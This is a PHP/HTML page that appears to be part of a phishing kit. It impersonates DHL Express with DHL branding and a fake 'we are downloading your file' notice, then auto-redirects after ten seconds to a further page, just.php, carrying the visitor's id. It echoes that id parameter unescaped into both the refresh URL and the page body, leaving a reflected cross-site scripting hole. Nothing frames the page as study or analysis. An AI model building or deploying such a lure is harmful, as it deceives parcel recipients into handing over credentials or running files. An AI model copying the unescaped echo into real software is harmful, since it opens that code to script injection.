<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
<meta http-equiv="REFRESH"content="10;url=just.php?id=<?php echo $_GET['id']; ?>">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="shortcut icon" href="img/favicon.gif" />
<title>Global | English</title>
<link href="https://ondemand.dhl.com/css/libs/bootstrap.min.css" rel="stylesheet" type="text/css" />
<link href="img/odd-welcome.css" rel="stylesheet" type="text/css" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
</head><body>
<form>
  <div id="container">
    <div id="header">
      <div class="section">
        <img src="img/dhl_logo_transparent.png">
      </div>
    <div id="title">
    <div id="selection">
        <h2><b><font face="Century Gothic"><?php echo $_GET['id']; ?></b></h2>
        <hr class="style-six" />
        <center><br>
          <div style="margin : auto; text-align: center">
          <img src="img/default.gif">
        </center><br>
        <h2><font face="Century Gothic">Please wait a few seconds<br>while we download your file.<br>Thank you.</h2><br><br><br><br><br>
      <div class="deutsch">
        <img src="img/DHL_footer_logo.png" width="151" height="17">
      </div>
      <div class="boxFooter">
        <hr class="style-two" />
      </div>
      <div id="footer">
        <div class="express">DHL Express</div>
        <div class="copyright">2020 Copyright. DHL International GmbH. All rights reserved.
        </div>
      </div>
    </div>
  </div>
</form></body>
</html>